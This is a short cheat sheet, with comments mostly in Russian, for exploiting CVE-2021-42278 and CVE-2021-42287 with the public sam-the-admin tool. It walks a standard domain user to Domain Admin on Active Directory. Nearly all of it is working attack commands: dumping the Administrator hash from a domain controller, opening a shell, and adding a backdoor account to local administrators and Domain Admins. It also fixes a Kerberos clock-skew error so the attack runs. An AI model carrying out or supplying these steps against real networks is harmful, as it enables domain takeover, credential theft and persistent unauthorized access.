Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 

    # скачиваем на kali linux https://github.com/WazeHell/sam-the-admin
    # разархивируем и переходим в папку
    $ cd sam-the-admin
    # устанавливаем зависимости
    $ pip3 install -r requirements.txt
    # запускаем експлойт
    # дампаем хеш   
    $ python3 sam_the_admin.py "domain.local/username:Password123" -dc-ip 10.10.10.10 -dc-host DC01 -dump -just-dc-user domain.local/Administrator
    # или получаем shell, потом добавляем локал админа
    $ python3 sam_the_admin.py "domain.local/UserName:Password123" -dc-ip 10.10.10.10 -dc-host DC01 -shell
    # C:\windows\
    system32\> net user /add privetkakdela Password321
    system32\> net localgroup administrators privetkakdela /add
    system32\> net group "domain admins" privetkakdela /add

### Known issues
- it will not work outside kali , i will update it later on :)
- Если получаем ошибку {
[-] Error getting TGT, Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Get TGT wrong!
}
# открываем файл в редакторе
$ sudo nano /etc/systemd/timesyncd.conf  
# раскоментм строчку ntp и вписываем туда айпишник дк
[Time]
NTP=dom.contr.ip.ad
FallbackNTP=ntp.ubuntu.com pool.ntp.org
# ctrl+o -> enter -> ctrl+x
$ sudo systemctl restart systemd-timesyncd
# если ошибка
$ sudo apt update
$ sudo apt install ntpdate
$ sudo ntpdate dom.contr.ip.ad
# теперь ошибки не будет

#### Check out 
- [CVE-2021-42287/CVE-2021-42278 Weaponisation ](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
- [sAMAccountName spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
